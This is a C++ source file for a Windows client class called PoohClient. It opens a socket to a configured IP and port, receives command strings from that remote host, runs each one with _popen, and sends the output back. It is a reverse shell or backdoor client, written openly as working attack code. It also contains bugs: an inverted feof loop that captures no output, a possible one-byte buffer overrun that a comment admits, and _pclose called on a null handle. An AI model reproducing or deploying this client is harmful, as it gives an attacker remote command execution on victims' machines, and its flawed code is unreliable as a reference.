#include "PoohClient.h"

WSADATA PoohClient::wsa;

PoohClient::PoohClient(const char* ip, unsigned short port)
{
	this->m_address.sin_addr.S_un.S_addr = inet_addr(ip);
	this->m_address.sin_family = AF_INET;
	this->m_address.sin_port = htons(port);
}

void PoohClient::initWS2()
{
	if (WSAStartup(MAKEWORD(2, 2), &PoohClient::wsa) != 0)
	{
		throw ErrorCodeException("Unable to initialize WinSock", WSAGetLastError());
	}
}

void PoohClient::start(const bool& runFlag)
{
	char cmd[MAX_COMMAND_LEN] = { 0 };
	int recvSize;
	FILE* process = NULL;
	std::string result;

	if ((this->m_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		throw ErrorCodeException("Unable to create socket", WSAGetLastError());
	}

	if (connect(this->m_socket, (struct sockaddr*)&this->m_address, sizeof(this->m_address)) < 0)
	{
		throw std::exception("Unable to connect to server");
	}

	this->m_connected = true;

	while (runFlag)
	{
		if ((recvSize = recv(this->m_socket, cmd, MAX_COMMAND_LEN, 0)) == SOCKET_ERROR)
		{
			closesocket(this->m_socket);
			this->m_connected = false;
			throw std::exception("Socket was closed");
		}
		cmd[recvSize] = 0; // This can cause an edge case! FIX
		process = _popen(cmd, "rt");
		if (process == NULL)
		{
			result = "Error while executing command!";
		}
		else
		{
			result = "";
			while (feof(process))
			{
				result += fgetc(process);
			}
		}
		_pclose(process);

		send(this->m_socket, result.c_str(), result.size(), 0);
	}

	closesocket(this->m_socket);
	this->m_connected = false;
}

bool PoohClient::isConnected() const
{
	return this->m_connected;
}
